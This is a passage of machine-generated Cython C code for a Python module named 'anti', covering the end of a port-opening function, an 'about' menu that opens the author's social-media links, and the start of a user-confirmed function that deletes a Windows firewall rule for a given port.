                            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                            if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_25, &__pyx_t_26, &__pyx_t_27);
                            if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_19, &__pyx_t_18, &__pyx_t_17) < 0)) __Pyx_ErrFetch(&__pyx_t_19, &__pyx_t_18, &__pyx_t_17);
                            __Pyx_XGOTREF(__pyx_t_19);
                            __Pyx_XGOTREF(__pyx_t_18);
                            __Pyx_XGOTREF(__pyx_t_17);
                            __Pyx_XGOTREF(__pyx_t_25);
                            __Pyx_XGOTREF(__pyx_t_26);
                            __Pyx_XGOTREF(__pyx_t_27);
                            __pyx_t_6 = __pyx_lineno; __pyx_t_23 = __pyx_clineno; __pyx_t_24 = __pyx_filename;
                            {
                                __Pyx_DECREF(__pyx_v_e);
                                __pyx_v_e = NULL;
                            }
                            if (PY_MAJOR_VERSION >= 3) {
                                __Pyx_XGIVEREF(__pyx_t_25);
                                __Pyx_XGIVEREF(__pyx_t_26);
                                __Pyx_XGIVEREF(__pyx_t_27);
                                __Pyx_ExceptionReset(__pyx_t_25, __pyx_t_26, __pyx_t_27);
                            }
                            __Pyx_XGIVEREF(__pyx_t_19);
                            __Pyx_XGIVEREF(__pyx_t_18);
                            __Pyx_XGIVEREF(__pyx_t_17);
                            __Pyx_ErrRestore(__pyx_t_19, __pyx_t_18, __pyx_t_17);
                            __pyx_t_19 = 0; __pyx_t_18 = 0; __pyx_t_17 = 0; __pyx_t_25 = 0; __pyx_t_26 = 0; __pyx_t_27 = 0;
                            __pyx_lineno = __pyx_t_6; __pyx_clineno = __pyx_t_23; __pyx_filename = __pyx_t_24;
                            goto __pyx_L13_except_error;
                        }
                        __pyx_L57_continue: {
                            __Pyx_DECREF(__pyx_v_e);
                            __pyx_v_e = NULL;
                            goto __pyx_L56_except_continue;
                            }
                        }
                    __pyx_L56_except_continue:;
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        goto __pyx_L17_try_continue;
                    } {
                        __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
                        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 154, __pyx_L13_except_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_GOTREF(__pyx_t_2);
                        __Pyx_GOTREF(__pyx_t_1);
                        goto __pyx_L67_except_continue;
                    __pyx_L67_except_continue:;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        goto __pyx_L17_try_continue;
                    }
                __pyx_L13_except_error:;
                    __Pyx_XGIVEREF(__pyx_t_11);
                    __Pyx_XGIVEREF(__pyx_t_12);
                    __Pyx_XGIVEREF(__pyx_t_13);
                    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
                    goto __pyx_L3_error;
                __pyx_L17_try_continue:;
                    __Pyx_XGIVEREF(__pyx_t_11);
                    __Pyx_XGIVEREF(__pyx_t_12);
                    __Pyx_XGIVEREF(__pyx_t_13);
                    __Pyx_ExceptionReset(__pyx_t_11, __pyx_t_12, __pyx_t_13);
                    goto __pyx_L9_continue;
                __pyx_L18_try_end:;
                }
            __pyx_L9_continue:;
            }
        }
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        goto __pyx_L8_try_end;
    __pyx_L3_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_ErrFetch(&__pyx_t_1, &__pyx_t_2, &__pyx_t_5);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_PermissionError); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 156, __pyx_L5_except_error)
            __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_23 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_1, __pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_ErrRestore(__pyx_t_1, __pyx_t_2, __pyx_t_5);
        __pyx_t_1 = 0; __pyx_t_2 = 0; __pyx_t_5 = 0;
        if (__pyx_t_23) {
            __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 156, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_4 = PyTuple_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 157, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_20 = 0;
            __pyx_t_21 = 127;
            __Pyx_INCREF(__pyx_kp_u_ERROR_Port);
            __pyx_t_20 += 12;
            __Pyx_GIVEREF(__pyx_kp_u_ERROR_Port);
            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_ERROR_Port);
            __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_port, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_21;
            __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_7);
            __pyx_t_7 = 0;
            __Pyx_INCREF(__pyx_kp_u_cannot_be_spoof_Need_administra);
            __pyx_t_20 += 49;
            __Pyx_GIVEREF(__pyx_kp_u_cannot_be_spoof_Need_administra);
            PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u_cannot_be_spoof_Need_administra);
            __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_4, 3, __pyx_t_20, __pyx_t_21); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 157, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 157, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_r);
            __pyx_r = Py_None; __Pyx_INCREF(Py_None);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            goto __pyx_L6_except_return;
        }
        __pyx_t_23 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_OSError);
        if (__pyx_t_23) {
            __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 159, __pyx_L5_except_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_XDECREF_SET(__pyx_v_e, __pyx_t_2); {
                __pyx_t_4 = PyTuple_New(4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 160, __pyx_L75_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_20 = 0;
                __pyx_t_21 = 127;
                __Pyx_INCREF(__pyx_kp_u_ERROR_Port);
                __pyx_t_20 += 12;
                __Pyx_GIVEREF(__pyx_kp_u_ERROR_Port);
                PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_ERROR_Port);
                __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_port, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 160, __pyx_L75_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_21;
                __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
                __Pyx_GIVEREF(__pyx_t_7);
                PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_7);
                __pyx_t_7 = 0;
                __Pyx_INCREF(__pyx_kp_u__22);
                __pyx_t_20 += 3;
                __Pyx_GIVEREF(__pyx_kp_u__22);
                PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u__22);
                __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_e, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 160, __pyx_L75_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __pyx_t_21 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_21) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_21;
                __pyx_t_20 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
                __Pyx_GIVEREF(__pyx_t_7);
                PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_7);
                __pyx_t_7 = 0;
                __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_4, 4, __pyx_t_20, __pyx_t_21); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 160, __pyx_L75_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __pyx_t_4 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 160, __pyx_L75_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_r);
                __pyx_r = Py_None; __Pyx_INCREF(Py_None);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                goto __pyx_L74_return;
            } {
            __pyx_L75_error:; {
                __Pyx_PyThreadState_declare
                    __Pyx_PyThreadState_assign
                    __pyx_t_13 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_27 = 0; __pyx_t_26 = 0; __pyx_t_25 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_27, &__pyx_t_26, &__pyx_t_25);
                if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_13, &__pyx_t_12, &__pyx_t_11) < 0)) __Pyx_ErrFetch(&__pyx_t_13, &__pyx_t_12, &__pyx_t_11);
                __Pyx_XGOTREF(__pyx_t_13);
                __Pyx_XGOTREF(__pyx_t_12);
                __Pyx_XGOTREF(__pyx_t_11);
                __Pyx_XGOTREF(__pyx_t_27);
                __Pyx_XGOTREF(__pyx_t_26);
                __Pyx_XGOTREF(__pyx_t_25);
                __pyx_t_23 = __pyx_lineno; __pyx_t_6 = __pyx_clineno; __pyx_t_28 = __pyx_filename;
                {
                    __Pyx_DECREF(__pyx_v_e);
                    __pyx_v_e = NULL;
                }
                if (PY_MAJOR_VERSION >= 3) {
                    __Pyx_XGIVEREF(__pyx_t_27);
                    __Pyx_XGIVEREF(__pyx_t_26);
                    __Pyx_XGIVEREF(__pyx_t_25);
                    __Pyx_ExceptionReset(__pyx_t_27, __pyx_t_26, __pyx_t_25);
                }
                __Pyx_XGIVEREF(__pyx_t_13);
                __Pyx_XGIVEREF(__pyx_t_12);
                __Pyx_XGIVEREF(__pyx_t_11);
                __Pyx_ErrRestore(__pyx_t_13, __pyx_t_12, __pyx_t_11);
                __pyx_t_13 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_27 = 0; __pyx_t_26 = 0; __pyx_t_25 = 0;
                __pyx_lineno = __pyx_t_23; __pyx_clineno = __pyx_t_6; __pyx_filename = __pyx_t_28;
                goto __pyx_L5_except_error;
            }
            __pyx_L74_return: {
                __pyx_t_25 = __pyx_r;
                __pyx_r = 0;
                __Pyx_DECREF(__pyx_v_e);
                __pyx_v_e = NULL;
                __pyx_r = __pyx_t_25;
                __pyx_t_25 = 0;
                goto __pyx_L6_except_return;
                }
            }
        }
        goto __pyx_L5_except_error;
    __pyx_L5_except_error:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        goto __pyx_L1_error;
    __pyx_L6_except_return:;
        __Pyx_XGIVEREF(__pyx_t_8);
        __Pyx_XGIVEREF(__pyx_t_9);
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_9, __pyx_t_10);
        goto __pyx_L0;
    __pyx_L8_try_end:;
    }
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v_count);
    __Pyx_XDECREF(__pyx_v_soc);
    __Pyx_XDECREF(__pyx_v_a);
    __Pyx_XDECREF(__pyx_v_b);
    __Pyx_XDECREF(__pyx_v_con_ip);
    __Pyx_XDECREF(__pyx_v_server_socket);
    __Pyx_XDECREF(__pyx_v_e);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_19about(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused);
static PyMethodDef __pyx_mdef_4anti_19about = { "about", (PyCFunction)__pyx_pw_4anti_19about, METH_NOARGS, 0 };
static PyObject* __pyx_pw_4anti_19about(PyObject* __pyx_self, CYTHON_UNUSED PyObject* unused) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("about (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_18about(__pyx_self);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_18about(CYTHON_UNUSED PyObject* __pyx_self) {
    PyObject* __pyx_v_a = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    int __pyx_t_4;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("about", 0);
    while (1) {
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 164, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
            }
        }
        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 164, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 165, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 165, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_2);
        __pyx_t_2 = 0;
        __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_kp_u_1, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 166, __pyx_L1_error)
            if (__pyx_t_4) {
                __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 167, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_3 = NULL;
                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
                    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
                    if (likely(__pyx_t_3)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                        __Pyx_INCREF(__pyx_t_3);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_1, function);
                    }
                }
                __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_kp_u_start_https_fb_me_khanh10a1) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_start_https_fb_me_khanh10a1);
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 167, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                goto __pyx_L5;
            }
        __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_kp_u_2, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 168, __pyx_L1_error)
            if (__pyx_t_4) {
                __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 169, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_3 = NULL;
                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
                    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
                    if (likely(__pyx_t_3)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                        __Pyx_INCREF(__pyx_t_3);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_1, function);
                    }
                }
                __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_kp_u_start_https_youtube_com_KhanhNgu) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_start_https_youtube_com_KhanhNgu);
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 169, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                goto __pyx_L5;
            }
        __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_kp_u_3, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 170, __pyx_L1_error)
            if (__pyx_t_4) {
                __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 171, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_3 = NULL;
                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
                    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
                    if (likely(__pyx_t_3)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                        __Pyx_INCREF(__pyx_t_3);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_1, function);
                    }
                }
                __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_3, __pyx_kp_u_start_https_github_com_KhanhNguy) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_start_https_github_com_KhanhNguy);
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 171, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                goto __pyx_L5;
            }
        __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_kp_u_0, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 172, __pyx_L1_error)
            if (__pyx_t_4) {
                goto __pyx_L4_break;
            }
    __pyx_L5:;
    }
__pyx_L4_break:;
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_AddTraceback("anti.about", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v_a);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_21remove_block(PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyMethodDef __pyx_mdef_4anti_21remove_block = { "remove_block", (PyCFunction)__pyx_pw_4anti_21remove_block, METH_O, 0 };
static PyObject* __pyx_pw_4anti_21remove_block(PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("remove_block (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_20remove_block(__pyx_self, ((PyObject*)__pyx_v_port));
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_20remove_block(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_v_a = NULL;
    CYTHON_UNUSED PyObject* __pyx_v__ = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    int __pyx_t_4;
    int __pyx_t_5;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("remove_block", 0);
    while (1) {
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 176, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
            }
        }
        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 176, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 177, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 177, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_2);
        __pyx_t_2 = 0;
        __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_n_u_Y, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 178, __pyx_L1_error)
            if (!__pyx_t_5) {
            }
            else {
                __pyx_t_4 = __pyx_t_5;
                goto __pyx_L6_bool_binop_done;
            }
        __pyx_t_5 = (__Pyx_PyUnicode_Equals(__pyx_v_a, __pyx_n_u_y, Py_EQ)); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 178, __pyx_L1_error)
            __pyx_t_4 = __pyx_t_5;
    __pyx_L6_bool_binop_done:;
        if (__pyx_t_4) {
            __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Popen); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_delet, __pyx_n_s_format); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_7)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                    __Pyx_INCREF(__pyx_t_7);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_3, function);
                }
            }
            __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_6);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 179, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
